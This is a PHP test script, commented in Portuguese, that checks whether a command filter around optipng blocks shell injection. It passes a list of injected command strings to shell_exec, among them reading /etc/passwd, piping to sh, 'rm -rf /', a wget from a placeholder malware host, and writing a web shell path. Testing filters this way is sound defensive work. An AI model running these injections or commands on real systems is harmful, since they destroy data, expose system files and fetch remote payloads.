<?php
echo "========================================\n";
echo "TESTE DE VULNERABILIDADES: ANINHAMENTO E RCE\n";
echo "========================================\n\n";

$cmd_target = "/usr/bin/optipng"; // Suponha que optipng seja permitido, mas vamos injetar nele

$tests = [
    "Ponto e vírgula" => "$cmd_target file.png ; cat /etc/passwd",
    "Pipe" => "$cmd_target file.png | sh",
    "AND lógico" => "$cmd_target file.png && rm -rf /",
    "OR lógico" => "$cmd_target invalid.png || wget http://malware.com/shell.sh",
    "Sub-shell (Dólar-Parênteses)" => "$cmd_target file.png \$(whoami)",
    "Sub-shell (Crase)" => "$cmd_target file.png `whoami`",
    "Redirecionamento (>)" => "$cmd_target file.png > /var/www/html/shell.php",
    "Quebra de linha (\\n)" => "$cmd_target file.png\ncat /etc/passwd",
    "Expansão de variável (\${})" => "$cmd_target file.png \${PATH}",
];

foreach ($tests as $name => $cmd) {
    echo str_pad("Testando $name ", 40, ".");
    ob_start();
    try {
        $result = shell_exec($cmd);
        $output = ob_get_clean();
        
        if ($result === false || $result === null) {
            echo " BLOQUEADO (retornou false/null)\n";
        } else {
            echo " PERMITIDO / EXECUTADO\n";
        }
    } catch (Throwable $e) {
        ob_get_clean();
        echo " ERRO/BLOQUEADO\n";
    }
}

echo "\n========================================\n";
echo "Fim do teste de vulnerabilidades.\n";
echo "========================================\n";
